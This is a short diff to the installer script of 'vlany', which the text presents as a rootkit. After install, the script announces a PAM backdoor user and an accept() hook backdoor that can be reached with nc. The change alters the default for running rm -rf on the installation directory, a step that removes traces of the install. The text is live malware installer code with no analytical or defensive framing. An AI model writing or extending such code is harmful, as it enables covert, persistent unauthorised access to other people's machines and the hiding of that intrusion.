@@ -358,9 +358,9 @@ if [ "$1" == "--cli" ]; then
     setup_vlany
 
     echo "The installation process has finished. You can now SSH into your PAM backdoor user, or you can use nc (or something better) to connect to your accept() hook backdoor."
-    read -p "Would you like to automatically remove this directory (`pwd`) on exit? (YES/NO) (case-sensitive) [YES]: "
+    read -p "Would you like to automatically remove this directory (`pwd`) on exit? (YES/NO) (case-sensitive) [NO]: "
     if [ -z $REPLY ]; then
-        rm -rf `pwd`
+        echo "Not removing `pwd`"
     elif [ "$REPLY" == "YES" ]; then
         rm -rf `pwd`
     elif [ "$REPLY" == "NO" ]; then
